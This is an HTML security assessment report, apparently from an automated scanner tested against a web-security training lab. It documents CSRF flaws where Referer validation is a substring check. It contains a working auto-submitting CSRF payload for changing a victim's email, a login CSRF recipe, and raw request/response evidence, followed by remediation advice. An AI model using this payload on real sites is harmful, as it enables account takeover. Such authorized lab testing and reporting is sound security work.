@@ -1,0 +1,448 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr6pdk1h-cqg1js</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#f57c00">MEDIUM</span> [csrf] CSRF with broken Referer validation on change-email enables victim account/email takeover</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#c9a227">LOW</span> [csrf] Login CSRF: Referer-based CSRF protection bypassable via substring match</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#c9a227">LOW</span> [burp] Strict transport security not enforced (3 URLs)</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] TLS certificate</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr6pdk1h-cqg1js</code></td></tr>
+<tr><td>Target</td><td><code>https://0a460024044074f283fb32c700b20073.web-security-academy.net/</code></td></tr>
+<tr><td>Started</td><td>2026-07-04T18:35:53.442Z</td></tr>
+<tr><td>Generated</td><td>2026-07-06T05:43:22.687Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>3 mapped · 3 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>4</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>*.web-security-academy.net</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>4 finding(s)</p><p class="sumtags"><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#c9a227">2</b> low</span><span><b style="color:#5f7d8c">1</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 1. [csrf] CSRF with broken Referer validation on change-email enables victim account/email takeover</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target https://0a460024044074f283fb32c700b20073.web-security-academy.net/</div>
+<div class="desc">POST /my-account/change-email changes the logged-in user's email with NO anti-CSRF token (the form/request carries only an `email` field). The endpoint tries to defend with Referer validation, but the check is BROKEN: it only requires that the lab/application domain appears as a SUBSTRING anywhere in the Referer, rather than validating the Referer's origin. The session cookie is `SameSite=None`, so it is sent on cross-site requests, making this remotely exploitable from the exploit server.
+
+Distinguishable evidence (valid wiener session cookie on all three):
+- NEGATIVE CONTROL ev-mr6r2tqz-2h: plain cross-site Referer (https://exploit-&lt;id&gt;.exploit-server.net/) =&gt; HTTP 400 &quot;Invalid referer header&quot; (REJECTED).
+- POSITIVE REPLAY 1 ev-mr6r2y09-2i: cross-site Referer with lab domain in query string (…exploit-server.net/?0a460024044074f283fb32c700b20073.web-security-academy.net) =&gt; HTTP 302 -&gt; /my-account, email changed to pwned-csrf-1@attacker.net (ACCEPTED).
+- POSITIVE REPLAY 2 ev-mr6r32a0-2j: same bypass, different path+email =&gt; HTTP 302 -&gt; /my-account, email changed to pwned-csrf-2@attacker.net (ACCEPTED, stable).
+Supporting: a missing Referer also =&gt; 400 (ev-mr6qxzgj-28), ruling out the &quot;Referer-must-be-present&quot; variant; probe_scenario differential also confirmed marker present only under the bypass (ev-mr6r0xe0-2c / ev-mr6r15yd-2e / ev-mr6r1eiw-2g).
+
+Impact: an attacker page on the exploit server silently changes a logged-in victim's account email; controlling the victim's email enables a password reset and full account takeover. Satisfies the lab PRIMARY objective (use the exploit server to change the victim's email).</div>
+<div><b>Reproduction</b></div><pre>Authenticated confirmation (as wiener:peter):
+1. POST /my-account/change-email, Referer: https://exploit-&lt;id&gt;.exploit-server.net/, body email=x@evil.net =&gt; 400 &quot;Invalid referer header&quot;.
+2. POST /my-account/change-email, Referer: https://exploit-&lt;id&gt;.exploit-server.net/?0a460024044074f283fb32c700b20073.web-security-academy.net, body email=x@evil.net =&gt; 302, email changed. (Only difference is the lab domain appearing in the Referer =&gt; broken substring validation.)
+
+Weaponized exploit-server payload (set response header `Referrer-Policy: unsafe-url` so the full URL incl. query string is sent as Referer):
+
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;form action=&quot;https://0a460024044074f283fb32c700b20073.web-security-academy.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;attacker@evil.net&quot;&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+      history.pushState(&quot;&quot;, &quot;&quot;, &quot;/?0a460024044074f283fb32c700b20073.web-security-academy.net&quot;);
+      document.forms[0].submit();
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+history.pushState() rewrites the exploit page URL to embed the lab domain in its query string; Referrer-Policy: unsafe-url makes the browser transmit that full URL as the Referer cross-origin, satisfying the broken substring check. A logged-in victim who loads the page has their email silently changed.
+
+Fix: use a per-session unpredictable anti-CSRF token validated server-side; do not rely on Referer. If Referer is validated, match the full origin (not a substring) and set the session cookie SameSite=Lax/Strict.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6r2tqz-2h</code> — <code>artifacts/_/ev-mr6r2tqz-2h/</code></div><div class="lbl">REQUEST</div><pre>POST /my-account/change-email HTTP/1.1
+Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+cookie: &lt;redacted&gt;
+referer: https://exploit-0a590088045474f5834f314601e000af.exploit-server.net/
+
+email=control-plain-crosssite%40evil.net</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 400
+content-length: 24
+content-type: application/json; charset=utf-8
+x-frame-options: SAMEORIGIN
+
+&quot;Invalid referer header&quot;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6r2y09-2i</code> — <code>artifacts/_/ev-mr6r2y09-2i/</code></div><div class="lbl">REQUEST</div><pre>POST /my-account/change-email HTTP/1.1
+Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+cookie: &lt;redacted&gt;
+referer: https://exploit-0a590088045474f5834f314601e000af.exploit-server.net/?0a460024044074f283fb32c700b20073.web-security-academy.net
+
+email=pwned-csrf-1%40attacker.net</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+content-length: 0
+location: /my-account?id=wiener
+x-frame-options: SAMEORIGIN</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6r32a0-2j</code> — <code>artifacts/_/ev-mr6r32a0-2j/</code></div><div class="lbl">REQUEST</div><pre>POST /my-account/change-email HTTP/1.1
+Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+cookie: &lt;redacted&gt;
+referer: https://exploit-0a590088045474f5834f314601e000af.exploit-server.net/blog?0a460024044074f283fb32c700b20073.web-security-academy.net
+
+email=pwned-csrf-2%40attacker.net</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+content-length: 0
+location: /my-account?id=wiener
+x-frame-options: SAMEORIGIN</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 2. [csrf] Login CSRF: Referer-based CSRF protection bypassable via substring match</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target https://0a460024044074f283fb32c700b20073.web-security-academy.net/</div>
+<div class="desc">POST /login carries no anti-CSRF token (the form has only username + password). Its sole CSRF defense is validating the Referer header, but the check is a naive substring match for the application's domain rather than a real origin check. Evidence: (1) a request with an off-domain Referer that does NOT contain the target domain — Referer: https://evil-attacker.com/nomatch — is rejected with 400 &quot;Invalid referer header&quot; (ev-mr6q636z-u, 24-byte body). (2) A request from the same off-domain origin whose URL merely INCLUDES the target domain as a substring — Referer: https://evil-attacker.com/?0a460024044074f283fb32c700b20073.web-security-academy.net — passes validation and the login is processed (200, 4247-byte login page), reproduced twice (ev-mr6q2jy8-h, ev-mr6q67h0-v). Because the session cookie is SameSite=None (sendable/settable cross-site, per analyze_session), an attacker can host a page whose URL embeds the target domain and which sets Referrer-Policy: unsafe-url (so the full URL — including the domain substring — is sent as the cross-origin Referer), auto-submitting a POST /login with attacker-controlled credentials. A victim who visits is silently authenticated as the attacker (login CSRF); the victim's subsequent activity is then recorded under the attacker's account.</div>
+<div><b>Reproduction</b></div><pre>1. NEGATIVE CONTROL: POST /login, body username=wiener&amp;password=x, header Referer: https://evil-attacker.com/nomatch  -&gt;  400 &quot;Invalid referer header&quot; (ev-mr6q636z-u). Also no-Referer at all -&gt; same 400 (ev-mr6pyyaw-6).
+2. BYPASS / POSITIVE x2: POST /login, same body, header Referer: https://evil-attacker.com/?0a460024044074f283fb32c700b20073.web-security-academy.net  -&gt;  200, login processed (ev-mr6q2jy8-h, ev-mr6q67h0-v). Only difference vs the control is that the off-domain Referer now contains the target domain as a substring.
+3. Confirm session cookie is SameSite=None (analyze_session) -&gt; cross-site sendable.
+4. Weaponize: attacker page at https://evil-attacker.com/?0a460024044074f283fb32c700b20073.web-security-academy.net with &lt;meta name=&quot;referrer&quot; content=&quot;unsafe-url&quot;&gt; and a form that auto-POSTs /login with attacker credentials. Victim's browser sends the full URL as Referer (passes the substring check), and is logged into the attacker's account.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6q636z-u</code> — <code>artifacts/s-0002/ev-mr6q636z-u/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+referer: https://evil-attacker.com/nomatch
+
+username=wiener&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 400
+content-length: 24
+content-type: application/json; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&quot;Invalid referer header&quot;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6q2jy8-h</code> — <code>artifacts/s-0002/ev-mr6q2jy8-h/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+referer: https://evil-attacker.com/?0a460024044074f283fb32c700b20073.web-security-academy.net
+
+username=wiener&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 4247
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labs.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a id='exploit-link' class='button' target='_blank' href='https://exploit-0a590088045474f5834f314601e000af.exploit-server.net'&gt;Go to exploit server&lt;/a&gt;
+                            &lt;button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'&gt;Submit solution&lt;/button&gt;
+                            &lt;script src='/resources/labheader/js/submitSolution.js'&gt;&lt;/script&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='VXNlIHRoZSBleHBsb2l0IHNlcnZlciB0byBkZWxpdmVyIGFuIGF0dGFjayB0aGF0IGNoYW5nZXMgdGhlIHZpY3RpbSB1c2VyJ3MgZW1haWwgYWRkcmVzcy4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2NzcmYvYnlwYXNzaW5nLXJlZmVyZXItYmFzZWQtZGVmZW5zZXMvbGFiLXJlZmVyZXItdmFsaWRhdGlvbi1icm9rZW4='&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Not solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                            &lt;a href=&quot;/my-account&quot;&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;h1&gt;Login&lt;/h1&gt;
+                    &lt;section&gt;
+                        &lt;p class=is-warning&gt;Invalid username or password.&lt;/p&gt;
+                        &lt;form class=login-form method=POST action=&quot;/login&quot;&gt;
+                            &lt;label&gt;Username&lt;/label&gt;
+                            &lt;input required type=username name=&quot;username&quot; autofocus&gt;
+                            &lt;label&gt;Password&lt;/label&gt;
+                            &lt;input required type=password name=&quot;password&quot;&gt;
+                            &lt;button class=button type=submit&gt; Log in &lt;/button&gt;
+                        &lt;/form&gt;
+                    &lt;/section&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6q67h0-v</code> — <code>artifacts/s-0002/ev-mr6q67h0-v/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+referer: https://evil-attacker.com/?0a460024044074f283fb32c700b20073.web-security-academy.net
+
+username=wiener&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 4247
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labs.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a id='exploit-link' class='button' target='_blank' href='https://exploit-0a590088045474f5834f314601e000af.exploit-server.net'&gt;Go to exploit server&lt;/a&gt;
+                            &lt;button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'&gt;Submit solution&lt;/button&gt;
+                            &lt;script src='/resources/labheader/js/submitSolution.js'&gt;&lt;/script&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='VXNlIHRoZSBleHBsb2l0IHNlcnZlciB0byBkZWxpdmVyIGFuIGF0dGFjayB0aGF0IGNoYW5nZXMgdGhlIHZpY3RpbSB1c2VyJ3MgZW1haWwgYWRkcmVzcy4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2NzcmYvYnlwYXNzaW5nLXJlZmVyZXItYmFzZWQtZGVmZW5zZXMvbGFiLXJlZmVyZXItdmFsaWRhdGlvbi1icm9rZW4='&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Not solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                            &lt;a href=&quot;/my-account&quot;&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;h1&gt;Login&lt;/h1&gt;
+                    &lt;section&gt;
+                        &lt;p class=is-warning&gt;Invalid username or password.&lt;/p&gt;
+                        &lt;form class=login-form method=POST action=&quot;/login&quot;&gt;
+                            &lt;label&gt;Username&lt;/label&gt;
+                            &lt;input required type=username name=&quot;username&quot; autofocus&gt;
+                            &lt;label&gt;Password&lt;/label&gt;
+                            &lt;input required type=password name=&quot;password&quot;&gt;
+                            &lt;button class=button type=submit&gt; Log in &lt;/button&gt;
+                        &lt;/form&gt;
+                    &lt;/section&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 3. [burp] Strict transport security not enforced (3 URLs)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">(confidence: CERTAIN) [+2 more URL(s): https://0a460024044074f283fb32c700b20073.web-security-academy.net/post, https://0a460024044074f283fb32c700b20073.web-security-academy.net/post/comment] @ https://0a460024044074f283fb32c700b20073.web-security-academy.net/login</div>
+<div><b>Reproduction</b></div><pre>Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6rifqv-2v</code> — <code>artifacts/_/ev-mr6rifqv-2v/</code></div><div class="lbl">REQUEST</div><pre>GET /login HTTP/1.1
+Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
+
+GET /login HTTP/1.1
+Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 4169
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labs.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a id='exploit-link' class='button' target='_blank' href='https://exploit-0a590088045474f5834f314601e000af.exploit-server.net'&gt;Go to exploit server&lt;/a&gt;
+                            &lt;button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'&gt;Submit solution&lt;/button&gt;
+                            &lt;script src='/resources/labheader/js/submitSolution.js'&gt;&lt;/script&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='VXNlIHRoZSBleHBsb2l0IHNlcnZlciB0byBkZWxpdmVyIGFuIGF0dGFjayB0aGF0IGNoYW5nZXMgdGhlIHZpY3RpbSB1c2VyJ3MgZW1haWwgYWRkcmVzcy4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2NzcmYvYnlwYXNzaW5nLXJlZmVyZXItYmFzZWQtZGVmZW5zZXMvbGFiLXJlZmVyZXItdmFsaWRhdGlvbi1icm9rZW4='&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Not solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                            &lt;a href=&quot;/my-account&quot;&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;h1&gt;Login&lt;/h1&gt;
+                    &lt;section&gt;
+                        &lt;form class=login-form method=POST action=&quot;/login&quot;&gt;
+                            &lt;label&gt;Username&lt;/label&gt;
+                            &lt;input required type=username name=&quot;username&quot; autofocus&gt;
+                            &lt;label&gt;Password&lt;/label&gt;
+                            &lt;input required type=password name=&quot;password&quot;&gt;
